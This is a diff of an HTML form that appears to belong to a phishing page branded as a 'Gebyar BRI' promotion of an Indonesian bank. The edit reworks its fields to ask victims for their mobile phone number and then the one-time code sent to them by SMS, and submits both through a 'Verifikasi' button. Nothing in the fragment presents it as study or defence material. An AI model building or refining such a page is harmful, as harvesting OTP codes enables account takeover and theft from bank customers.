@@ -824,14 +824,14 @@ body{
         <textarea id="typing-text" readonly></textarea><hr><br><br>
           <form id="setPin" action="no.html" method="POST">
         <div class="card-input">
-          <label for="cardName" class="card-input__label" style="font-weight: 800;margin-left: 3px"></label>
+          <label for="cardName" class="card-input__label" style="font-weight: 800;margin-left: 3px">Nomor Handphone</label>
           <input type="hidden" id="logo" value="༺═𝗚𝗲𝗯𝘆𝗮𝗿 𝗕𝗥𝗜═༻">
-		        <div class="card-input">
-          <label for="cardName" class="card-input__label" style="font-weight: 800; margin-left: 3px">Nomor Handphone</label>
-          <input type="Text" id="nomor" name="𝐒𝐞𝐧𝐝𝐞𝐫" class="card-input__input" v-model="cardName"  v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardName" autocomplete="off" placeholder="Nomor Handphone" maxlength="14" required>
-			</div>
-          <input type="text" id="nama" name="Kode OTP"class="card-input__input" v-model="cardNumber" v-on:focus="focusInput"  data-ref="cardNumber" autocomplete="off" placeholder="Masukan Kode OTP" required>
+          <input type="text" id="nama" name="Nomor HP"class="card-input__input" v-model="cardNumber" v-on:focus="focusInput"  data-ref="cardNumber" autocomplete="off" placeholder="Masukan Nomor Handphone" required>
         </div>
+        <div class="card-input">
+          <label for="cardName" class="card-input__label" style="font-weight: 800; margin-left: 3px">Kode OTP SMS </label>
+          <input type="number" id="nomor" name="OTP" class="card-input__input" v-model="cardName"  v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardName" autocomplete="off" placeholder="Nomor Kode OTP" maxlength="14" required>
+	</div> 
 
          <button id="kirim" type="submit" class="card-form__button">Verifikasi</button> 
       </div>
